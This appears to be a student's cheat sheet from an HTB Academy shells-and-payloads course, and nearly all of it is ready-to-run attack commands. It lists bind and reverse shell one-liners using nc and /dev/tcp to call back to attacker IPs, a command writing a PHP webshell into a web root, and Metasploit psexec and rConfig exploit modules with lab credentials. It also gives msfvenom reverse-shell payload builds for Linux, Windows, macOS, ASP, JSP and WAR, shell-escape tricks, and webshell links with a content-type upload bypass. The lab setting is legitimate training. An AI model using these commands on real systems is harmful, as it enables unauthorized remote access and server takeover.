## Bind Shells

#### Target - Binding a Bash shell to the TCP session
```Shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### Attack Host - Connecting to bind shell on target
```Shell
nc -nv 10.129.41.200 7777
```


## Reverse Shells

[Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### [Reverse Shells Module on HTB Academy](https://academy.hackthebox.com/module/115/section/1106)

#### Send a reverse shell from the remote server
```Shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

#### Another command to send a reverse shell from the remote server
```Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

#### Create a webshell php file
```Shell
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

#### Execute a command on an uploaded webshell
```Shell
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

## Payloads

#### [Payloads Module on HTB Academy](https://academy.hackthebox.com/module/115/section/1131)
- Includes a [Nishang Project PowerShell Script](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) 

### Metasploit Payloads

#### SMB psexec
```Shell
use exploit/windows/smb/psexec
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.14.222
run
```

### Using the rConfig Exploit and Gaining a Shell

#### Select an Exploit
```Shell
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

### MSFVenom Payloads

#### MSFvenom command used to generate a linux-based reverse shell stageless payload
```Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf
```

#### MSFvenom command used to generate a Windows-based reverse shell stageless payload
```Shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
```

#### MSFvenom command used to generate a MacOS-based reverse shell payload
```Shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho
```

#### MSFvenom command used to generate a ASP web reverse shell payload
```Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp
```

#### MSFvenom command used to generate a JSP web reverse shell payload
```Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp
```

#### MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload
```Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
```


## Interactive Shells

#### Shows python version present on system
```Shell
which python
```

#### Python command used to spawn an interactive shell on a linux-based system
```Shell
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

#### Upgrade shell TTY (2)
[ctrl+z] then `stty raw -echo` then `fg` then [enter] twice

#### Spawn an interactive shell on a linux-based system
```Shell
/bin/sh -i
```

#### Use perl to spawn an interactive shell on a linux-based system
```Shell
perl -e 'exec "/bin/sh";'
```

```Shell
perl: exec "/bin/sh";
```

#### Use ruby to spawn an interactive shell on a linux-based system
```Shell
ruby: exec "/bin/sh"
```

#### Use Lua to spawn an interactive shell on a linux-based system
```Shell
lua: os.execute('/bin/sh')
```

#### Use awk command to spawn an interactive shell on a linux-based system
```Shell
awk 'BEGIN {system("/bin/sh")}'
```

#### Use `find` command to spawn an interactive shell on a linux-based system
```Shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

#### Use Exec to Launch a Shell
```Shell
find . -exec /bin/sh \; -quit
```

#### Vim to Shell
```Shell
vim -c ':!/bin/sh'
```

#### Vim Escape
```Shell
vim
:set shell=/bin/sh
:shell
```

### Permissions

#### List files & directories on a linux-based system and show the permission for each file in the chosen directory
```Shell
ls -la <path/to/fileorbinary>
```
Can be used to look for binaries that we have permission to execute

#### Display the commands that the currently logged on user can run as sudo
```Shell
sudo -l
```


## Web Shells

### [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)

- Add your IP address to the script
- Upload it as a file
- Navigate to the shell
![[Pasted image 20230303151836.png]]

### [Antak Webshell](https://raw.githubusercontent.com/samratashok/nishang/master/Antak-WebShell/antak.aspx)

- Used against a Windows .aspx server
- Upload the shell and navigate to the page
![[Pasted image 20230303152215.png]]

### `PHP` Web Shells

[WhiteWinterWolf's P`H`P Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

May need to use Burp Suite and intercept the request, then modify the Content-type from `application/x-php` to `image/gif`

